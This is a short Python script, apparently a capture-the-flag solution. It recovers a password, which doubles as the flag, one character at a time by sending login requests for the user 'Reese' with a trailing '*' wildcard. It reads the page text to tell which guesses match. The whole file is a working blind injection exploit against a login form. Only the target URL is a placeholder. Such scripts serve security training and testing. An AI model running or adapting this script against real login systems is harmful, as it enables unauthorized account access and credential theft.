import requests
import string
s = requests.session()
url = '__URL__'

printables = string.printable.replace(
    '*', '').replace('/', '').replace('(', '')

pswd = ""

while '}' not in pswd:  # Discovered password is flag so we can automate the loop as it stops when our flag completed
    for pr in printables:
        data = {
            "username": 'Reese',  # Referancing the note that Reese left on the page
            "password": pswd + pr + '*'  # '*' vulnerable char makes password predictable
        }
        r = s.post(url, data=data)
        print('trying:', pswd + pr)
        if 'No search results' in r.text:  # Page is seems static is no problem to use a unique string relative to login page
            pswd += pr
            print('New char found:', pr)
            print('current password prefix:', pswd)

print('flag:', pswd)
